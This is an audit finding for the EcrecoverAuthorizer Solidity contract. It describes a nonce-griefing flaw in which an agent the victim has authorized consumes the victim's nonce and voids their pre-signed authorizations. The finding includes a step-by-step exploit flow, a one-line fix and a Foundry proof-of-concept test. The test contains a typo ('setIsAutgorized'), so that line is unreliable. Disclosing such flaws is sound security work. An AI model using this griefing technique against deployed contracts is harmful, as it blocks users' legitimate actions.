### Title
Authorized agent can increment victim's EcrecoverAuthorizer nonce without victim's signature, invalidating all pending signed authorizations - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)` returns `true` for, and unconditionally increments `nonce[authorization.authorizer]` on success. Because the nonce belongs to the `authorizer` field (the victim), not the signer, any Midnight-authorized agent can craft and self-sign an `Authorization` naming the victim as `authorizer`, pass the authorization check using their own Midnight delegation, and advance the victim's nonce — without ever holding the victim's private key.

### Finding Description

**Code path** — `src/periphery/EcrecoverAuthorizer.sol` lines 24–48:

```solidity
function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
    require(block.timestamp <= authorization.deadline, Expired());
    require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // ← nonce incremented here

    // ... digest construction ...
    address signer = ecrecover(digest, signature.v, signature.r, signature.s);
    require(signer != address(0), InvalidSignature());
    require(
        signer == authorization.authorizer                                          // path 1: victim signs
            || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // path 2: authorized agent signs
        Unauthorized()
    );
    IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
}
```

**Root cause** — The nonce that is incremented is `nonce[authorization.authorizer]` (the victim's nonce), but the signer allowed by path 2 is any address the victim has previously authorized on Midnight. The attacker does not need the victim's private key; they only need to be listed in `midnight.isAuthorized(victim, attacker) == true`. They supply `authorization.authorizer = victim` and sign the struct with their own key. The nonce check passes (they read the current public nonce), the nonce is incremented, and the signature check passes via path 2.

**Exploit flow:**
1. Victim (`V`) has previously called `midnight.setIsAuthorized(attacker, true, V)` for any legitimate purpose (e.g., granting a relayer or keeper).
2. Victim distributes off-chain signed `Authorization(authorizer=V, authorized=X, isAuthorized=true, nonce=N)` to legitimate agents.
3. Attacker reads `ecrecoverAuthorizer.nonce(V)` → `N`.
4. Attacker constructs `Authorization(authorizer=V, authorized=attacker, isAuthorized=true, nonce=N, deadline=block.timestamp+1)` and signs it with **attacker's own key**.
5. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
6. `nonce[V]` is incremented to `N+1` before the signature check.
7. Signature check: `signer = attacker`, `isAuthorized(V, attacker) = true` → passes.
8. All victim's pre-signed authorizations carrying `nonce=N` now revert with `InvalidNonce`.
9. Attacker repeats with `nonce=N+1`, `N+2`, … keeping the victim's nonce perpetually ahead.

**Why existing checks fail** — The `Unauthorized()` guard is satisfied by path 2 using the attacker's own Midnight delegation. There is no check that the signer must equal `authorization.authorizer` when the nonce is being consumed. The Certora spec (`EcrecoverAuthorizer.spec` line 63) describes the property as "a successful call increments only the **signer's** nonce," but the code increments `nonce[authorization.authorizer]`, not `nonce[signer]` — confirming the design intent diverges from the implementation.

### Impact Explanation
Any victim who has ever granted Midnight authorization to any address (attacker, relayer, keeper, etc.) can have their `EcrecoverAuthorizer` nonce advanced at will. This permanently invalidates all pending signed `Authorization` structs the victim has distributed, blocking every action that relies on them: `take`, `repay`, `withdraw`, `liquidate`, and `claimFee` when those actions are gated behind a pre-signed EcrecoverAuthorizer delegation. The attacker pays only gas per increment and can front-run any submission.

### Likelihood Explanation
The precondition — victim has authorized attacker on Midnight — is the normal operating state for any user who delegates to a relayer, keeper, or bundler contract. The attack is permissionless beyond that, requires no special role, is repeatable indefinitely, and can be automated to front-run every legitimate submission. Cost is one cheap transaction per invalidation.

### Recommendation
Restrict the signer to the `authorization.authorizer` themselves; remove path 2 from `EcrecoverAuthorizer.setIsAuthorized`. If delegation is desired, require the authorizer's own signature and let the caller be anyone (the current permissionless-caller design already handles relaying). Concretely, replace:

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

with:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

This preserves the permissionless-relay property (anyone can submit the transaction) while ensuring only the authorizer's own key can consume their nonce.

### Proof of Concept

```solidity
function testNonceGriefByAuthorizedAgent() public {
    // Setup: victim authorizes attacker on Midnight (normal delegation)
    vm.prank(victim);
    midnight.setIsAutgorized(address(ecrecoverAuthorizer), true, victim); // needed for later calls
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Victim pre-signs a legitimate authorization for agent at nonce=0
    Authorization memory legitAuth = Authorization({
        authorizer: victim, authorized: agent, isAuthorized: true,
        nonce: 0, deadline: block.timestamp + 1 days
    });
    Signature memory legitSig = signAuthorization(legitAuth, victimKey);

    // Attacker reads current nonce (0), self-signs an auth naming victim as authorizer
    Authorization memory attackAuth = Authorization({
        authorizer: victim, authorized: attacker, isAuthorized: true,
        nonce: 0, deadline: block.timestamp + 1 days
    });
    Signature memory attackSig = signAuthorization(attackAuth, attackerKey);

    // Attacker submits — succeeds, increments nonce[victim] to 1
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);
    assertEq(ecrecoverAuthorizer.nonce(victim), 1);

    // Victim's legitimate pre-signed auth now reverts
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(legitAuth, legitSig);
}
```

```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
```

```text
rule effects(env e, EcrecoverAuthorizer.Authorization authorization, EcrecoverAuthorizer.Signature signature, address other) {
    require other != authorization.authorizer;
    uint256 nonceBefore = nonce(authorization.authorizer);
    uint256 otherNonceBefore = nonce(other);
```
